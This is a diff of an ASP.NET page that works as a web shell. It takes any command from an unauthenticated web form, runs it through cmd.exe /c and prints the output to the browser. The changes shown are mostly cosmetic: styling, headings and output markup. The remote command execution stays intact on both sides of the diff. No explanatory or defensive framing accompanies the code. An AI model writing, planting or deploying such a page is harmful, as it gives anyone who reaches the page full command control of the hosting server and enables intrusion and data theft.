@@ -1,44 +1,51 @@
 <%@ Page Language="C#" Debug="true" %>
 <%@ Import Namespace="System.Diagnostics" %>
-<%@ Import Namespace="System.IO" %>
 
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Command Executor</title>
+    <title>Execute System Command</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-color: #f4f4f4;
             color: #333;
             padding: 20px;
         }
         h1 {
-            color: #0066cc;
+            color: #444;
         }
-        .command-form {
-            margin-bottom: 20px;
+        textarea {
+            width: 100%;
+            height: 150px;
+            font-family: monospace;
+            padding: 10px;
         }
-        .command-output {
+        input[type="submit"] {
+            margin-top: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .output {
             background-color: #fff;
             border: 1px solid #ccc;
-            padding: 15px;
+            padding: 10px;
+            margin-top: 20px;
             white-space: pre-wrap;
-            font-family: monospace;
         }
     </style>
 </head>
 <body>
-    <h1>Execute Command</h1>
-    <form method="post" class="command-form">
-        <label for="command">Enter Command:</label>
-        <input type="text" id="command" name="command" style="width: 300px;" />
-        <input type="submit" value="Run" />
+    <h1>System Command Executor</h1>
+    <form method="post">
+        <label for="command">Enter Command:</label><br />
+        <input type="text" id="command" name="command" style="width: 80%;" />
+        <input type="submit" value="Execute" />
     </form>
 
-    <div class="command-output">
-        <h2>Output:</h2>
-        <pre>
+    <div class="output">
+        <h2>Command Output:</h2>
         <%
             if (IsPostBack)
             {
@@ -49,35 +56,34 @@
                     {
                         Process process = new Process();
                         process.StartInfo.FileName = "cmd.exe";
-                        process.StartInfo.Arguments = "/c " + command; // تنفيذ الأمر المدخل
-                        process.StartInfo.UseShellExecute = false;
+                        process.StartInfo.Arguments = "/c " + command;
                         process.StartInfo.RedirectStandardOutput = true;
                         process.StartInfo.RedirectStandardError = true;
+                        process.StartInfo.UseShellExecute = false;
                         process.StartInfo.CreateNoWindow = true;
                         process.Start();
 
                         string output = process.StandardOutput.ReadToEnd();
-                        string error = process.StandardError.ReadToEnd();
+                        string errorOutput = process.StandardError.ReadToEnd();
+
                         process.WaitForExit();
 
                         if (!string.IsNullOrEmpty(output))
                         {
-                            Response.Write(Server.HtmlEncode(output));
+                            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
                         }
-
-                        if (!string.IsNullOrEmpty(error))
+                        if (!string.IsNullOrEmpty(errorOutput))
                         {
-                            Response.Write("<span style='color: red;'>" + Server.HtmlEncode(error) + "</span>");
+                            Response.Write("<pre style='color: red;'>" + Server.HtmlEncode(errorOutput) + "</pre>");
                         }
                     }
                     catch (Exception ex)
                     {
-                        Response.Write("<span style='color: red;'>Error: " + Server.HtmlEncode(ex.Message) + "</span>");
+                        Response.Write("<p style='color: red;'>Error: " + Server.HtmlEncode(ex.Message) + "</p>");
                     }
                 }
             }
         %>
-        </pre>
     </div>
 </body>
 </html>
